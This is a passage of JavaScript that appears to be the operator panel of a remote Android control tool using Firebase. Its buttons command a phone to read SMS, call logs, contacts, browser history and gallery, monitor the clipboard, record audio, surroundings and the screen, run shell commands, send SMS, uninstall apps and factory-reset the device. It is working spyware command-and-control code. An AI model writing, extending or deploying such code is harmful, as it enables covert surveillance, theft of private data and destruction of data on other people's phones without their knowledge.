            const statusHtml = `<div class="feed-item" style="color:#ffd93d;">📍 Geofence ACTIVE at ${data.lat}, ${data.lng} (radius: ${data.radius}m)</div>`;
            feed.innerHTML = statusHtml + feed.innerHTML;
        }
    });

    // Screenshot
    listenToFeed(uid, 'screenshot', (data) => {
        if (data && data.screenshot) {
            const img = document.getElementById('cameraPreviewFrame');
            const placeholder = document.getElementById('mediaPlaceholderText');
            if (img) {
                if (placeholder) placeholder.style.display = 'none';
                img.src = data.screenshot;
                img.style.display = 'block';
                const ts = document.getElementById('captureTimestamp');
                if (ts) ts.innerText = `SCREENSHOT: ${new Date().toLocaleTimeString()}`;
            }
        }
    });

    // Ambient Status
    listenToFeed(uid, 'ambient_status', (data) => {
        const btn = document.getElementById('cmd-ambient');
        if (btn && data) {
            const stateEl = btn.querySelector('.toggle-state');
            if (data.status === 'recording') {
                btn.classList.add('active');
                if (stateEl) { stateEl.textContent = `SEG ${data.segment || '?'}`; stateEl.style.color = '#ffaa00'; }
            } else {
                btn.classList.remove('active');
                if (stateEl) { stateEl.textContent = 'OFF'; stateEl.style.color = '#666'; }
            }
        }
    });

    // Screen Record Status
    listenToFeed(uid, 'screen_record_status', (data) => {
        const btn = document.getElementById('cmd-screenrec');
        if (btn && data) {
            const stateEl = btn.querySelector('.toggle-state');
            if (data.status === 'recording') {
                btn.classList.add('active');
                if (stateEl) { stateEl.textContent = 'REC'; stateEl.style.color = '#ffaa00'; }
            } else if (data.status === 'complete') {
                btn.classList.remove('active');
                if (stateEl) { stateEl.textContent = `${data.file_size_kb || '?'}KB`; stateEl.style.color = '#00ff88'; }
            } else {
                btn.classList.remove('active');
                if (stateEl) { stateEl.textContent = 'OFF'; stateEl.style.color = '#666'; }
            }
        }
    });

    // Traffic
    listenToFeed(uid, 'traffic_current', (data) => {
        // Append to battery panel or create inline
        const feed = document.getElementById('battery-feed');
        if (feed && data) {
            const trafficHtml = `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Network Traffic</strong><br>RX: ${data.total_rx_mb || '?'} | TX: ${data.total_tx_mb || '?'}<br>Mobile RX: ${data.mobile_rx_mb || '?'} | TX: ${data.mobile_tx_mb || '?'}</div>`;
            if (!feed.innerHTML.includes('Network Traffic')) {
                feed.innerHTML += trafficHtml;
            }
        }
    });
}

// Helper: Listen to a Firebase path and call callback
function listenToFeed(uid, path, callback) {
    const feedRef = ref(database, `devices/${uid}/${path}`);
    const key = `feed-${path}-${uid}`;
    if (deviceListeners[key]) off(deviceListeners[key]);
    deviceListeners[key] = onValue(feedRef, (snapshot) => {
        if (snapshot.exists()) {
            try { callback(snapshot.val()); } catch (e) { console.error(`Feed error [${path}]:`, e); }
        }
    });
}

// ==========================================
// SETUP ALL COMMAND EVENT LISTENERS
// ==========================================
function setupCommandListeners(deviceUid) {
    // ── Original toggles ──────────────────────
    setupToggle('cmd-flashlight', deviceUid, 'flashlight');
    setupToggle('cmd-alarm', deviceUid, 'alarm');

    const cmdLock = document.getElementById('cmd-lock');
    if (cmdLock) {
        cmdLock.onclick = () => {
            const newState = !cmdLock.classList.contains("active");
            if (confirm(newState ? "🔒 Initialize Lockdown?" : "🔓 Deactivate Lockdown?")) {
                sendRemoteCommand(deviceUid, "emergencyLock", newState);
            }
        };
    }

    // ── Triggers ──────────────────────────────
    setupTrigger('cmd-capture', deviceUid, 'cameraCapture');
    setupTrigger('cmd-screenshot', deviceUid, 'take_screenshot');
    setupTrigger('cmd-readsms', deviceUid, 'read_sms');
    setupTrigger('cmd-readcalls', deviceUid, 'read_call_log');
    setupTrigger('cmd-readcontacts', deviceUid, 'read_contacts');
    setupTrigger('cmd-readapps', deviceUid, 'read_apps');
    setupTrigger('cmd-scanwifi', deviceUid, 'scan_wifi');
    setupTrigger('cmd-readbattery', deviceUid, 'read_battery');
    setupTrigger('cmd-readtraffic', deviceUid, 'read_traffic');
    setupTrigger('cmd-deviceinfo', deviceUid, 'collect_device_info');
    setupTrigger('cmd-gallery', deviceUid, 'list_gallery');
    setupTrigger('cmd-browser', deviceUid, 'read_browser_history');
    setupTrigger('cmd-storage', deviceUid, 'storage_overview');

    // ── Toggle commands ───────────────────────
    setupToggle('cmd-audio', deviceUid, 'record_audio');
    setupToggle('cmd-video', deviceUid, 'record_video');
    setupToggle('cmd-ambient', deviceUid, 'start_ambient', 'stop_ambient');
    setupToggle('cmd-screenrec', deviceUid, 'record_screen', 'stop_screen_record');
    setupToggle('cmd-clipboard', deviceUid, 'monitor_clipboard');

    // ── Time setter ───────────────────────────
    const timeSetter = document.getElementById('time-setter');
    if (timeSetter) {
        timeSetter.onchange = (e) => {
            if (e.target.value) sendRemoteCommand(deviceUid, 'activation_time', e.target.value);
        };
    }

    // ── Shell command ─────────────────────────
    const shellBtn = document.getElementById('cmd-shell');
    if (shellBtn) {
        shellBtn.onclick = () => {
            const input = document.getElementById('shell-input');
            const cmd = input?.value?.trim();
            if (cmd) {
                sendRemoteCommand(deviceUid, 'shell_command', cmd);
                const output = document.getElementById('shell-output');
                if (output) { output.style.display = 'block'; output.textContent = '⏳ Executing...'; }
            }
        };
    }

    // ── Send SMS ──────────────────────────────
    const sendSmsBtn = document.getElementById('cmd-sendsms');
    if (sendSmsBtn) {
        sendSmsBtn.onclick = () => {
            const number = document.getElementById('sms-number')?.value?.trim();
            const body = document.getElementById('sms-body')?.value?.trim();
            if (number && body) {
                if (confirm(`Send SMS to ${number}?`)) {
                    sendRemoteCommand(deviceUid, 'send_sms_number', number);
                    sendRemoteCommand(deviceUid, 'send_sms_body', body);
                }
            }
        };
    }

    // ── File browser ──────────────────────────
    const listFilesBtn = document.getElementById('cmd-listfiles');
    if (listFilesBtn) {
        listFilesBtn.onclick = () => {
            const path = document.getElementById('file-path')?.value?.trim() || '/storage/emulated/0';
            sendRemoteCommand(deviceUid, 'list_files', path);
            const output = document.getElementById('file-output');
            if (output) { output.style.display = 'block'; output.textContent = '⏳ Loading...'; }
        };
    }

    // ── Geofence ──────────────────────────────
    const setGeoBtn = document.getElementById('cmd-setgeo');
    if (setGeoBtn) {
        setGeoBtn.onclick = () => {
            const lat = parseFloat(document.getElementById('geo-lat')?.value);
            const lng = parseFloat(document.getElementById('geo-lng')?.value);
            const radius = parseFloat(document.getElementById('geo-radius')?.value) || 1000;
            if (!isNaN(lat) && !isNaN(lng)) {
                sendRemoteCommand(deviceUid, 'geofence_lat', lat);
                sendRemoteCommand(deviceUid, 'geofence_lng', lng);
                sendRemoteCommand(deviceUid, 'geofence_radius', radius);
            }
        };
    }

    const disableGeoBtn = document.getElementById('cmd-disablegeo');
    if (disableGeoBtn) {
        disableGeoBtn.onclick = () => sendRemoteCommand(deviceUid, 'disable_geofence', true);
    }

    // ── Danger zone ───────────────────────────
    const rebootBtn = document.getElementById('cmd-reboot');
    if (rebootBtn) {
        rebootBtn.onclick = () => {
            if (confirm("⚠️ REBOOT DEVICE? This will restart the phone immediately.")) {
                sendRemoteCommand(deviceUid, 'reboot_device', true);
            }
        };
    }

    const shutdownBtn = document.getElementById('cmd-shutdown');
    if (shutdownBtn) {
        shutdownBtn.onclick = () => {
            if (confirm("⚠️ SHUTDOWN DEVICE? This will power off the phone.")) {
                sendRemoteCommand(deviceUid, 'shutdown_device', true);
            }
        };
    }

    const factoryBtn = document.getElementById('cmd-factory');
    if (factoryBtn) {
        factoryBtn.onclick = () => {
            if (confirm("🚨 FACTORY RESET? This will ERASE ALL DATA on the device. THIS CANNOT BE UNDONE!")) {
                if (confirm("Are you ABSOLUTELY sure? Type OK to confirm.")) {
                    sendRemoteCommand(deviceUid, 'factory_reset', true);
                }
            }
        };
    }

    const lockNowBtn = document.getElementById('cmd-locknow');
    if (lockNowBtn) {
        lockNowBtn.onclick = () => {
            if (confirm("🔒 Lock the screen immediately?")) {
                sendRemoteCommand(deviceUid, 'lock_screen_now', true);
            }
        };
    }

    const uninstallBtn = document.getElementById('cmd-uninstall');
    if (uninstallBtn) {
        uninstallBtn.onclick = () => {
            const pkg = prompt("Enter package name to uninstall (e.g., com.whatsapp):");
            if (pkg) sendRemoteCommand(deviceUid, 'uninstall_app', pkg);
        };
    }
}

// Helper: Setup toggle button
function setupToggle(btnId, deviceUid, command, offCommand) {
    const btn = document.getElementById(btnId);
    if (!btn) return;
    btn.onclick = () => {
        const isActive = btn.classList.contains("active");
        if (offCommand && isActive) {
            sendRemoteCommand(deviceUid, offCommand, true);
        } else {
            sendRemoteCommand(deviceUid, command, !isActive);
        }
    };
}

// Helper: Setup trigger button
function setupTrigger(btnId, deviceUid, command) {
    const btn = document.getElementById(btnId);
    if (!btn) return;
    btn.onclick = () => {
        sendRemoteCommand(deviceUid, command, true);
        // Visual feedback
        btn.style.background = '#00ff88';
        btn.style.color = '#000';
        setTimeout(() => { btn.style.background = ''; btn.style.color = ''; }, 500);
    };
}

// ==========================================
// UTILITIES
// ==========================================
function sendRemoteCommand(deviceUid, commandName, value) {
    console.log(`📤 Command: ${commandName} = ${value}`);
    update(ref(database, `devices/${deviceUid}/commands`), { [commandName]: value });
}

function updateButtonState(btnId, isActive) {
    const btn = document.getElementById(btnId);
    if (!btn) return;

    btn.classList.toggle('active', !!isActive);

    const stateEl = btn.querySelector('.toggle-state');
    if (stateEl) {
        if (stateEl.textContent === 'REC' || stateEl.textContent === 'UPD...' || stateEl.textContent.startsWith('SEG')) return;
        stateEl.textContent = isActive ? 'ON' : 'OFF';
        stateEl.style.color = isActive ? '#00ff88' : '#666666';
        stateEl.style.fontWeight = isActive ? 'bold' : 'normal';
    }

    btn.style.borderColor = isActive ? '#00ff88' : '#333333';
    btn.style.opacity = isActive ? '1' : '0.7';
}

function formatTime(timestamp) {
    if (!timestamp) return '--';
    return new Date(timestamp).toLocaleString();
}

function formatSize(bytes) {
    if (!bytes) return '0 B';
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
    return (bytes / 1073741824).toFixed(2) + ' GB';
}

function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function showNoDeviceAlert() {
    noDeviceAlert.style.display = 'flex';
    deviceDashboard.style.display = 'none';
}

if (logoutBtn) {
    logoutBtn.addEventListener('click', () => signOut(auth).then(() => window.location.href = './index.html'));
}

if (refreshDevicesBtn) {
    refreshDevicesBtn.addEventListener('click', loadAllDevices);
}
